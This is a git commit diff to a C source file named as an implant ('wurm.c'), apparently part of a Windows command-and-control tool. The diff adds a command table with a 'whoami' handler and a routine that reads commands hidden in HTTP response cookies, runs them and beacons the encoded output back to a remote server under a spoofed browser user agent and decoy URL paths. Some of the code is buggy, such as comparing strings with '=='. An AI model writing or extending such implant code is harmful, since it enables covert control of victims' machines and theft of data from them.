0bb2f955148bd5f30c7224a0d65b9eaad6a777bc
Real-Cryillic <cunningham.dom@outlook.com>
2022-11-18 18:52:07 -0500

    refactor command processing and patching

--- sarla/implant/src/wurm.c
+++ sarla/implant/src/wurm.c
@@ -2,34 +2,51 @@
 #include <windows.h>
 #include <wininet.h>
 
+#define pointer_length 1
+
 struct {
     struct {
-        char    hostname[MAX_PATH];
-        char    username[MAX_PATH];
-        DWORD   pid;
-        DWORD   version;
+        char            hostname[MAX_PATH];
+        char            username[MAX_PATH];
+        DWORD           pid;
+        DWORD           version;
     } info;
     struct {
-        char*   address;
-        int     port;
-        char*   user_agent;
-        char*   path;
-        char*   status;
-        char*   format;
+        char*           address;
+        int             port;
+        char*           user_agent;
+        char*           path;
+        char*           status;
+        char*           format;
     } http;
     struct {
-        char*   cookie;
-        char*   keyword;
+        char*           cookie;
+        char*           keyword;
     } auth;
     struct {
-        DWORD   size;
-        char*   buffer;
-        char*   length;
+        DWORD           size;
+        char*           buffer;
+        char*           length;
     } data;
     struct {
-        int     count;
+        int             count;
     } beacon;
 } wurm;
+
+unsigned char patch_list_name[pointer_length] = {0xAA};
+
+BOOL AA$whoami(CHAR **output) {
+    DWORD username_buffer = 256;
+    CHAR username[256];
+    if (GetUserNameA(username, &username_buffer)) {
+        *output = (CHAR*)calloc(strlen(username) + 1, sizeof(CHAR));
+        strcat_s(*output, strlen(username) + 1, username);
+        return TRUE;
+    }
+    return FALSE;
+}
+
+BOOL (*patch_list_pointers[pointer_length]) (CHAR **output) = {AA$whoami};
 
 char* get_endpoint() {
     char path_list[5][11] = {"index", "images", "download", "news", "about"};
@@ -103,7 +120,7 @@ void Encode(char* data_to_encode) {
 }
 
 BOOL Request() {
-    printf("sending beacon...\n");
+    printf("Sending beacon...\n");
     wurm.beacon.count += 1;
     
     HINTERNET hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -114,6 +131,10 @@ BOOL Request() {
             if (hRequest != NULL) {
                 HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD);
                 HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size);
+
+                if (wurm.http.status == "output") {
+                    return TRUE;
+                }
 
                 CHAR *temp_buffer = NULL;
                 DWORD buffer_length = 0;
@@ -141,6 +162,7 @@ BOOL Request() {
                         printf("Response:%s\n", wurm.auth.cookie);
                     } else {
                         printf("Response:%s\n", cookie);
+                        Process(cookie);
                     }
                 }
 
@@ -163,7 +185,41 @@ BOOL Request() {
     return TRUE;
 }
 
-BOOL Process() {
+BOOL Process(char* cookie) {
+    char* allocated_output = (CHAR*)calloc(10, sizeof(CHAR));
+    char* output = NULL;
+
+    int hex_command = atoi(cookie);
+
+    printf("Command: 0x%x\n", hex_command);
+
+    for (int i = 0; i < pointer_length; i++) {
+        if (hex_command == patch_list_name[i]) {
+            printf("Executing Command\n");
+            if ((*patch_list_pointers)(&output)) {
+                printf("Output:%s", output);
+
+                int output_length = strlen(allocated_output) + strlen(output) + 1;
+                allocated_output = (CHAR*)realloc(allocated_output, output_length);
+                strcat_s(allocated_output, output_length, output);
+            }
+        }
+    }
+    free(output);
+
+    if (strlen(allocated_output) > 0) {
+        wurm.http.format = "%s:%s";
+        wurm.http.status = "output";
+
+        CHAR *data_to_encode = malloc(strlen(wurm.http.format) + strlen(wurm.http.status) + strlen(allocated_output));
+        sprintf(data_to_encode, wurm.http.format, wurm.http.status, allocated_output);
+
+        Encode(data_to_encode);
+
+        Request();
+    }
+
+    free(allocated_output);
 
 }
 
@@ -182,6 +238,7 @@ int main(int argc, char* argv[]) {
     printf("Port:%d\n", wurm.http.port);
     get_endpoint();
     printf("Path: %s\n", wurm.http.path);
+
     wurm.http.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
     wurm.http.path = "images";
 
